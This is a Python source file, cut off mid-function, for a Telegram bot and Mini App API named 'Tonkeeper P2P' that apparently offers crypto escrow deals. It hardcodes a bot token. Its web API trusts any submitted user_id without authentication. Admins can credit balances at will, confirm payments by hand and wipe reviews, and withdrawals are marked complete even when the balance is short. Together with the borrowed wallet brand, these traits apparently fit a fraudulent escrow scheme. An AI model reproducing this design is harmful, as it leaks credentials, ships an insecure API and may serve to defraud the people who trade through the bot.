import asyncio
import json
import os
import uuid
from datetime import datetime
from typing import Dict

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties

# ============================================================
# 1. КОНФИГУРАЦИЯ
# ============================================================
BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
MASTER_ADMIN_ID = 8855434638
BOT_USERNAME = "tonkeeperp2p_bot"
BOT_NAME = "Tonkeeper P2P"
MINI_APP_URL = "https://saitminiapp.onrender.com"

# ============================================================
# 2. ИНИЦИАЛИЗАЦИЯ
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# ============================================================
# 3. ФАЙЛЫ
# ============================================================
FILES = {
    "deals": "deals.json",
    "admins": "admins.json",
    "balance": "balance.json",
    "reviews": "reviews.json",
    "verification": "verification.json",
    "withdraw": "withdraw_requests.json",
}

def load_json(file):
    if os.path.exists(file):
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

deals = load_json(FILES["deals"])
admins = load_json(FILES["admins"])
balance = load_json(FILES["balance"])
reviews = load_json(FILES["reviews"])
verification_data = load_json(FILES["verification"])
withdraw_requests = load_json(FILES["withdraw"])

# ============================================================
# 4. ПОМОЩНИКИ
# ============================================================
def is_admin(user_id: int) -> bool:
    return user_id == MASTER_ADMIN_ID or str(user_id) in admins

def get_balance(user_id: int) -> Dict:
    uid = str(user_id)
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
        save_json(FILES["balance"], balance)
    return balance[uid]

def add_balance(user_id: int, currency: str, amount: float):
    uid = str(user_id)
    curr = currency.lower()
    if uid not in balance:
        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
    balance[uid][curr] = balance[uid].get(curr, 0) + amount
    save_json(FILES["balance"], balance)

def is_verified(user_id: int) -> bool:
    uid = str(user_id)
    if uid not in verification_data:
        return False
    if "verified_at" in verification_data[uid]:
        verified_time = datetime.fromisoformat(verification_data[uid]["verified_at"])
        return (datetime.now() - verified_time).total_seconds() < 86400
    return False

# ============================================================
# 5. КЛАВИАТУРЫ
# ============================================================
def main_menu_keyboard(user_id: int):
    buttons = [
        [
            InlineKeyboardButton(text="📱 Создать сделку", callback_data="create_deal_choice"),
            InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
        ],
        [
            InlineKeyboardButton(text="📊 Мои сделки", callback_data="menu_deals"),
            InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
        ],
        [
            InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL)),
        ]
    ]
    if is_admin(user_id):
        buttons.append([
            InlineKeyboardButton(text="👑 Админ панель", callback_data="menu_admin"),
        ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def admin_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
        [InlineKeyboardButton(text="💰 Начислить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="👥 Управление админами", callback_data="admin_manage_admins")],
        [InlineKeyboardButton(text="⭐️ Управление отзывами", callback_data="admin_manage_reviews")],
        [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

def back_to_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
    ])

def create_deal_choice_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Создать в Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
        [InlineKeyboardButton(text="🤖 Создать в боте", callback_data="create_deal_bot")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
    ])

def currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
    ])

# ============================================================
# 6. FSM
# ============================================================
class DealStates(StatesGroup):
    waiting_product = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_buyer = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_currency = State()
    waiting_amount = State()

# ============================================================
# 7. ОБРАБОТЧИКИ БОТА
# ============================================================

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.text and message.text.startswith("/start deal_"):
        deal_id = message.text.split("_")[1]
        await handle_deal_link(message, deal_id)
        return

    await message.answer(
        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n"
        "Безопасные P2P сделки с криптовалютой.\n"
        "👇 Выберите действие:",
        reply_markup=main_menu_keyboard(message.from_user.id)
    )

@dp.callback_query(lambda c: c.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "🔥 <b>Tonkeeper P2P</b> 🔥\n\nВыберите действие:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    except:
        await callback.message.answer(
            "🔥 <b>Tonkeeper P2P</b> 🔥\n\nВыберите действие:",
            reply_markup=main_menu_keyboard(callback.from_user.id)
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "create_deal_choice")
async def create_deal_choice(callback: types.CallbackQuery):
    try:
        await callback.message.edit_text(
            "📱 <b>Создать сделку</b>\n\n"
            "Выберите способ:\n"
            "• <b>Mini App</b> — удобный интерфейс\n"
            "• <b>Бот</b> — быстрый текстовый режим",
            reply_markup=create_deal_choice_keyboard()
        )
    except:
        await callback.message.answer(
            "📱 <b>Создать сделку</b>",
            reply_markup=create_deal_choice_keyboard()
        )
    await callback.answer()

@dp.callback_query(lambda c: c.data == "create_deal_bot")
async def create_deal_bot(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.edit_text(
            "📝 <b>Шаг 1 из 4</b>\n\nОпишите товар или услугу:"
        )
    except:
        await callback.message.answer("📝 Опишите товар или услугу:")
    await state.set_state(DealStates.waiting_product)
    await callback.answer()

@dp.message(DealStates.waiting_product)
async def get_product(message: types.Message, state: FSMContext):
    await state.update_data(product=message.text.strip())
    await message.answer(
        "💱 <b>Шаг 2 из 4</b>\n\nВыберите валюту:",
        reply_markup=currency_keyboard()
    )
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(lambda c: c.data.startswith("curr_"))
async def get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    try:
        await callback.message.edit_text(
            f"💰 <b>Шаг 3 из 4</b>\n\nВведите сумму в <b>{currency}</b>:"
        )
    except:
        await callback.message.answer(f"💰 Введите сумму в {currency}:")
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@dp.message(DealStates.waiting_amount)
async def get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError
        await state.update_data(amount=amount)
        await message.answer(
            "👤 <b>Шаг 4 из 4</b>\n\nВведите username покупателя (без @):"
        )
        await state.set_state(DealStates.waiting_buyer)
    except:
        await message.answer("❌ Введите положительное число")

@dp.message(DealStates.waiting_buyer)
async def get_buyer(message: types.Message, state: FSMContext):
    buyer_username = message.text.strip().replace("@", "").lower()
    data = await state.get_data()

    deal_id = str(uuid.uuid4())[:8]
    deals[deal_id] = {
        "deal_id": deal_id,
        "seller_id": message.from_user.id,
        "seller_username": message.from_user.username or str(message.from_user.id),
        "buyer_username": buyer_username,
        "buyer_id": None,
        "product": data["product"],
        "currency": data["currency"],
        "amount": data["amount"],
        "status": "waiting_payment",
        "created_at": datetime.now().isoformat(),
        "paid_by_admin": None,
        "completed_at": None
    }
    save_json(FILES["deals"], deals)

    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"📦 {data['product']}\n"
        f"💰 {data['amount']} {data['currency']}\n"
        f"👤 @{buyer_username}\n\n"
        f"🔗 <code>{link}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 Скопировать ссылку", callback_data=f"copy_link_{deal_id}")],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )
    await state.clear()

@dp.callback_query(lambda c: c.data.startswith("copy_link_"))
async def copy_link(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    await callback.answer(f"✅ Ссылка скопирована!\n{link}", show_alert=True)

async def handle_deal_link(message: types.Message, deal_id: str):
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже завершена")
        return

    if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
        await message.answer(f"❌ Доступ запрещён. Сделка для @{deal['buyer_username']}")
        return

    deal["buyer_id"] = message.from_user.id
    save_json(FILES["deals"], deals)

    await message.answer(
        f"✈️ <b>Сделка #{deal_id}</b>\n\n"
        f"📦 {deal['product']}\n"
        f"💰 {deal['amount']} {deal['currency']}\n"
        f"👤 Продавец: @{deal['seller_username']}\n\n"
        f"💳 Оплатите и напишите админу: /pay {deal_id}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
            [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
        ])
    )

# --- БАЛАНС ---
@dp.callback_query(lambda c: c.data == "menu_balance")
async def menu_balance(callback: types.CallbackQuery):
    bal = get_balance(callback.from_user.id)
    text = (
        f"💰 <b>Ваш баланс</b>\n\n"
        f"💎 TON: {bal.get('ton', 0)}\n"
        f"⭐️ STARS: {bal.get('stars', 0)}\n"
        f"💰 RUB: {bal.get('rub', 0)}\n"
        f"🌐 UAH: {bal.get('uah', 0)}"
    )
    try:
        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
    except:
        await callback.message.answer(text, reply_markup=back_to_main_keyboard())
    await callback.answer()

# --- МОИ СДЕЛКИ ---
@dp.callback_query(lambda c: c.data == "menu_deals")
async def menu_deals(callback: types.CallbackQuery):
    user_deals = []
    for d_id, d in deals.items():
        if d.get("seller_id") == callback.from_user.id:
            user_deals.append((d_id, d))

    if not user_deals:
        await callback.message.edit_text("📭 У вас нет сделок", reply_markup=back_to_main_keyboard())
        return

    text = "📊 <b>Ваши сделки</b>\n\n"
    for d_id, d in user_deals[-10:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"

    try:
        await callback.message.edit_text(text, reply_markup=back_to_main_keyboard())
    except:
        await callback.message.answer(text, reply_markup=back_to_main_keyboard())
    await callback.answer()

# --- ОТЗЫВЫ ---
@dp.callback_query(lambda c: c.data == "menu_reviews")
async def menu_reviews(callback: types.CallbackQuery):
    reviews_list = list(reviews.values())[-10:]
    if not reviews_list:
        text = "⭐️ <b>Отзывы</b>\n\nПока нет отзывов"
    else:
        text = "⭐️ <b>Отзывы</b>\n\n"
        for r in reviews_list:
            text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
            text += f"📝 {r.get('text', '')[:80]}\n\n"

    try:
        await callback.message.edit_text(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    except:
        await callback.message.answer(
            text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))],
                [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
            ])
        )
    await callback.answer()

# --- АДМИН ПАНЕЛЬ ---
@dp.callback_query(lambda c: c.data == "menu_admin")
async def menu_admin(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    try:
        await callback.message.edit_text(
            "👑 <b>Админ панель</b>\n\nВыберите действие:",
            reply_markup=admin_panel_keyboard()
        )
    except:
        await callback.message.answer(
            "👑 <b>Админ панель</b>\n\nВыберите действие:",
            reply_markup=admin_panel_keyboard()
        )
    await callback.answer()

# --- ВСЕ СДЕЛКИ (АДМИН) ---
@dp.callback_query(lambda c: c.data == "admin_all_deals")
async def admin_all_deals(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    if not deals:
        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard())
        return

    text = "📊 <b>Все сделки</b>\n\n"
    for d_id, d in list(deals.items())[-20:]:
        status_map = {
            "waiting_payment": "⏳ Ожидает оплаты",
            "paid": "✅ Оплачено",
            "awaiting_confirmation": "📦 Ожидает подтверждения",
            "completed": "🎉 Завершено"
        }
        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
        text += f"   👤 {d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
        text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n\n"

    try:
        await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    except:
        await callback.message.answer(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

# --- ЗАЯВКИ НА ВЫВОД (АДМИН) ---
@dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
async def admin_withdraw_requests(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}

    if not pending:
        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard())
        return

    text = "💲 <b>Заявки на вывод</b>\n\n"
    for rid, req in list(pending.items())[-10:]:
        text += f"#{rid}\n"
        text += f"   👤 ID: {req.get('user_id', '?')}\n"
        text += f"   💰 {req.get('amount', 0)} {req.get('currency', '')}\n"
        text += f"   📝 {req.get('details', '')[:30]}\n"
        text += f"   ➡️ /confirm_withdraw {rid}\n\n"

    try:
        await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
    except:
        await callback.message.answer(text[:4000], reply_markup=admin_panel_keyboard())
    await callback.answer()

# --- НАЧИСЛИТЬ БАЛАНС (АДМИН) ---
@dp.callback_query(lambda c: c.data == "admin_add_balance")
async def admin_add_balance_start(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    await callback.message.edit_text(
        "💰 <b>Начислить баланс</b>\n\nВведите Telegram ID пользователя:"
    )
    await state.set_state(AdminStates.waiting_user_id)
    await callback.answer()

@dp.message(AdminStates.waiting_user_id)
async def admin_get_user_id(message: types.Message, state: FSMContext):
    try:
        user_id = int(message.text.strip())
        await state.update_data(target_user_id=user_id)
        await message.answer(
            "💱 Выберите валюту:",
            reply_markup=currency_keyboard()
        )
        await state.set_state(AdminStates.waiting_currency)
    except:
        await message.answer("❌ Введите корректный ID")

@dp.callback_query(lambda c: c.data.startswith("curr_") and c.data != "curr_")
async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(target_currency=currency)
    await callback.message.edit_text(f"💰 Введите сумму в <b>{currency}</b>:")
    await state.set_state(AdminStates.waiting_amount)
    await callback.answer()

@dp.message(AdminStates.waiting_amount)
async def admin_get_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.strip())
        if amount <= 0:
            raise ValueError

        data = await state.get_data()
        target_user_id = data.get("target_user_id")
        currency = data.get("target_currency")

        add_balance(target_user_id, currency, amount)

        await message.answer(
            f"✅ Начислено <b>{amount} {currency}</b> пользователю <b>{target_user_id}</b>",
            reply_markup=admin_panel_keyboard()
        )
        await state.clear()
    except:
        await message.answer("❌ Введите положительное число")

# --- УПРАВЛЕНИЕ АДМИНАМИ ---
@dp.callback_query(lambda c: c.data == "admin_manage_admins")
async def admin_manage_admins(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"

    await callback.message.edit_text(
        f"👥 <b>Управление админами</b>\n\n"
        f"Главный админ: {MASTER_ADMIN_ID}\n"
        f"Дополнительные админы:\n{admin_list}\n\n"
        f"/add_admin [ID] - добавить\n"
        f"/remove_admin [ID] - удалить",
        reply_markup=admin_panel_keyboard()
    )
    await callback.answer()

@dp.message(Command("add_admin"))
async def add_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ Только главный админ")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /add_admin [ID]")
        return

    try:
        new_admin_id = int(args[1])
        admins[str(new_admin_id)] = True
        save_json(FILES["admins"], admins)
        await message.answer(f"✅ Админ {new_admin_id} добавлен")
    except:
        await message.answer("❌ Введите корректный ID")

@dp.message(Command("remove_admin"))
async def remove_admin(message: types.Message):
    if message.from_user.id != MASTER_ADMIN_ID:
        await message.answer("⛔ Только главный админ")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /remove_admin [ID]")
        return

    try:
        admin_id = int(args[1])
        if admin_id == MASTER_ADMIN_ID:
            await message.answer("❌ Нельзя удалить главного админа")
            return
        if str(admin_id) in admins:
            del admins[str(admin_id)]
            save_json(FILES["admins"], admins)
            await message.answer(f"✅ Админ {admin_id} удалён")
        else:
            await message.answer("❌ Админ не найден")
    except:
        await message.answer("❌ Введите корректный ID")

# --- УПРАВЛЕНИЕ ОТЗЫВАМИ ---
@dp.callback_query(lambda c: c.data == "admin_manage_reviews")
async def admin_manage_reviews(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    reviews_list = list(reviews.values())

    if not reviews_list:
        await callback.message.edit_text(
            "⭐️ <b>Управление отзывами</b>\n\nПока нет отзывов",
            reply_markup=admin_panel_keyboard()
        )
        return

    text = "⭐️ <b>Управление отзывами</b>\n\n"
    for r in reviews_list[-10:]:
        text += f"👤 {r.get('user', 'Аноним')} | {'⭐' * r.get('rating', 5)}\n"
        text += f"📝 {r.get('text', '')[:50]}\n"
        text += f"🆔 {r.get('id', '')}\n"
        text += f"➡️ /delete_review {r.get('id', '')}\n\n"

    await callback.message.edit_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🗑 Очистить все отзывы", callback_data="admin_clear_reviews")],
            [InlineKeyboardButton(text="◀️ Назад в админку", callback_data="menu_admin")]
        ])
    )
    await callback.answer()

@dp.message(Command("delete_review"))
async def delete_review_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /delete_review [ID]")
        return

    review_id = args[1]
    if review_id not in reviews:
        await message.answer("❌ Отзыв не найден")
        return

    del reviews[review_id]
    save_json(FILES["reviews"], reviews)
    await message.answer(f"✅ Отзыв {review_id} удалён")

@dp.callback_query(lambda c: c.data == "admin_clear_reviews")
async def admin_clear_reviews(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return

    if not reviews:
        await callback.answer("❌ Нет отзывов", show_alert=True)
        return

    reviews.clear()
    save_json(FILES["reviews"], reviews)
    await callback.message.edit_text("✅ Все отзывы удалены", reply_markup=admin_panel_keyboard())
    await callback.answer()

# --- КОМАНДЫ АДМИНА ---
@dp.message(Command("pay"))
async def pay_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /pay [ID сделки]")
        return

    deal_id = args[1]
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "waiting_payment":
        await message.answer("❌ Сделка уже обработана")
        return

    deal["status"] = "paid"
    deal["paid_by_admin"] = message.from_user.id
    save_json(FILES["deals"], deals)

    await message.answer(f"✅ Оплата подтверждена для сделки #{deal_id}")

    try:
        await bot.send_message(
            deal["seller_id"],
            f"💎 <b>Сделка #{deal_id} оплачена!</b>\n\n"
            f"💰 {deal['amount']} {deal['currency']}\n"
            f"👤 @{deal['buyer_username']}\n\n"
            f"Нажмите «Передал товар»",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📦 Передал товар", callback_data=f"seller_done_{deal_id}")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
            ])
        )
    except:
        pass

@dp.callback_query(lambda c: c.data.startswith("seller_done_"))
async def seller_done(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "paid":
        await callback.answer("⏳ Сначала оплата")
        return

    deal["status"] = "awaiting_confirmation"
    save_json(FILES["deals"], deals)

    await callback.message.edit_text(f"✅ Вы подтвердили передачу товара по сделке #{deal_id}")

    try:
        await bot.send_message(
            deal["buyer_id"],
            f"📦 <b>Продавец передал товар по сделке #{deal_id}</b>\n\n"
            f"💰 {deal['amount']} {deal['currency']}\n"
            f"👤 @{deal['seller_username']}\n\n"
            f"Подтвердите получение:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Получил товар", callback_data=f"buyer_confirm_{deal_id}")],
                [InlineKeyboardButton(text="🔥 Открыть Mini App", web_app=WebAppInfo(url=MINI_APP_URL))]
            ])
        )
    except:
        pass

    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("buyer_confirm_"))
async def buyer_confirm(callback: types.CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена")
        return

    deal = deals[deal_id]
    if deal["status"] != "awaiting_confirmation":
        await callback.answer("⏳ Сделка не в статусе ожидания")
        return

    add_balance(deal["seller_id"], deal["currency"], deal["amount"])

    seller_balance = get_balance(deal["seller_id"])
    buyer = deal["buyer_username"]
    if buyer not in seller_balance["deal_partners"]:
        seller_balance["deal_partners"][buyer] = 0
    seller_balance["deal_partners"][buyer] += 1
    save_json(FILES["balance"], balance)

    deal["status"] = "completed"
    deal["completed_at"] = datetime.now().isoformat()
    save_json(FILES["deals"], deals)

    await callback.message.edit_text(
        f"🎉 <b>Сделка #{deal_id} завершена!</b>\n\n"
        f"💳 {deal['amount']} {deal['currency']} зачислены на баланс продавца",
        reply_markup=back_to_main_keyboard()
    )

    try:
        await bot.send_message(
            deal["seller_id"],
            f"🎉 <b>Сделка #{deal_id} завершена!</b>\n\n"
            f"💰 {deal['amount']} {deal['currency']} зачислены на ваш баланс"
        )
    except:
        pass

    await callback.answer()

@dp.message(Command("confirm_withdraw"))
async def confirm_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /confirm_withdraw [ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer("❌ Заявка не найдена")
        return

    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return

    bal = get_balance(req["user_id"])
    curr_key = req["currency"].lower()
    if bal.get(curr_key, 0) >= req["amount"]:
        bal[curr_key] -= req["amount"]
        save_json(FILES["balance"], balance)

    req["status"] = "completed"
    req["completed_at"] = datetime.now().isoformat()
    save_json(FILES["withdraw"], withdraw_requests)

    await message.answer(f"✅ Вывод #{request_id} подтверждён")

    try:
        await bot.send_message(
            req["user_id"],
            f"✅ <b>Ваш вывод подтверждён!</b>\n\n"
            f"💰 {req['amount']} {req['currency']}"
        )
    except:
        pass

@dp.message(Command("reject_withdraw"))
async def reject_withdraw_command(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён")
        return

    args = message.text.split()
    if len(args) != 2:
        await message.answer("❗️ /reject_withdraw [ID]")
        return

    request_id = args[1]
    if request_id not in withdraw_requests:
        await message.answer("❌ Заявка не найдена")
        return

    req = withdraw_requests[request_id]
    if req.get("status") != "pending":
        await message.answer("❌ Заявка уже обработана")
        return

    req["status"] = "rejected"
    save_json(FILES["withdraw"], withdraw_requests)

    await message.answer(f"❌ Вывод #{request_id} отклонён")

# ============================================================
# 8. ВЕБ-СЕРВЕР ДЛЯ MINI APP API
# ============================================================
from aiohttp import web

async def handle_api(request):
    """Обрабатывает запросы от Mini App"""
    try:
        data = await request.json()
    except:
        data = {}

    user_id = data.get('user_id')
    endpoint = request.path

    print(f"📡 API запрос: {endpoint} от user_id={user_id}")

    # --- ПРОВЕРКА АДМИНА ---
    if endpoint == '/api/is_admin':
        is_admin_status = is_admin(user_id)
        return web.json_response({
            'success': True,
            'is_admin': is_admin_status
        }, headers={'Access-Control-Allow-Origin': '*'})

    # --- БАЛАНС ---
    elif endpoint == '/api/balance':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers={'Access-Control-Allow-Origin': '*'})
        bal = get_balance(user_id)
        return web.json_response({'success': True, 'balance': bal}, headers={'Access-Control-Allow-Origin': '*'})

    # --- СДЕЛКИ ---
    elif endpoint == '/api/deals':
        if not user_id:
            return web.json_response({'success': False, 'error': 'user_id required'}, headers={'Access-Control-Allow-Origin': '*'})
        user_deals = []
        for d_id, d in deals.items():
            if d.get('seller_id') == user_id:
                d_copy = d.copy()
                d_copy['deal_id'] = d_id
                user_deals.append(d_copy)
        return web.json_response({'success': True, 'deals': user_deals}, headers={'Access-Control-Allow-Origin': '*'})

    # --- СОЗДАНИЕ СДЕЛКИ ---
    elif endpoint == '/api/create_deal':
        product = data.get('product')
        currency = data.get('currency')
        amount = data.get('amount')
        buyer_username = data.get('buyer_username')
        username = data.get('username', str(user_id))

        if not all([user_id, product, currency, amount, buyer_username]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers={'Access-Control-Allow-Origin': '*'})

        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            "deal_id": deal_id,
            "seller_id": user_id,
            "seller_username": username,
            "buyer_username": buyer_username.lower(),
            "buyer_id": None,
            "product": product,
            "currency": currency,
            "amount": float(amount),
            "status": "waiting_payment",
            "created_at": datetime.now().isoformat(),
            "paid_by_admin": None,
            "completed_at": None
        }
        save_json(FILES["deals"], deals)

        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"

        return web.json_response({
            'success': True,
            'deal_id': deal_id,
            'link': link
        }, headers={'Access-Control-Allow-Origin': '*'})

    # --- ВЫВОД ---
    elif endpoint == '/api/withdraw':
        currency = data.get('currency')
        details = data.get('details')

        if not all([user_id, currency, details]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers={'Access-Control-Allow-Origin': '*'})

        bal = get_balance(user_id)
        curr_key = currency.lower()
        if bal.get(curr_key, 0) <= 0:
            return web.json_response({'success': False, 'error': 'Insufficient balance'}, headers={'Access-Control-Allow-Origin': '*'})

        request_id = str(uuid.uuid4())[:8]
        withdraw_requests[request_id] = {
            "id": request_id,
            "user_id": user_id,
            "username": str(user_id),
            "currency": currency,
            "amount": bal[curr_key],
            "details": details,
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        save_json(FILES["withdraw"], withdraw_requests)

        return web.json_response({'success': True, 'request_id': request_id}, headers={'Access-Control-Allow-Origin': '*'})

    # --- ОТЗЫВЫ ---
    elif endpoint == '/api/reviews':
        limit = data.get('limit', 10)
        page = data.get('page', 0)
        reviews_list = list(reviews.values())
        start = page * limit
        end = start + limit
        paginated = reviews_list[start:end]
        return web.json_response({
            'success': True,
            'reviews': paginated,
            'total': len(reviews_list)
        }, headers={'Access-Control-Allow-Origin': '*'})

    # --- ДОБАВИТЬ ОТЗЫВ ---
    elif endpoint == '/api/add_review':
        rating = data.get('rating')
        text = data.get('text')
        anonymous = data.get('anonymous', True)

        if not all([user_id, rating, text]):
            return web.json_response({'success': False, 'error': 'Missing fields'}, headers={'Access-Control-Allow-Origin': '*'})

        if not is_verified(user_id):
            return web.json_response({'success': False, 'error': 'Verification required'}, headers={'Access-Control-Allow-Origin': '*'})

        user_deals = [d for d in deals.values() if d.get('seller_id') == user_id and d.get('status') == 'completed']
        if len(user_deals) < 1:
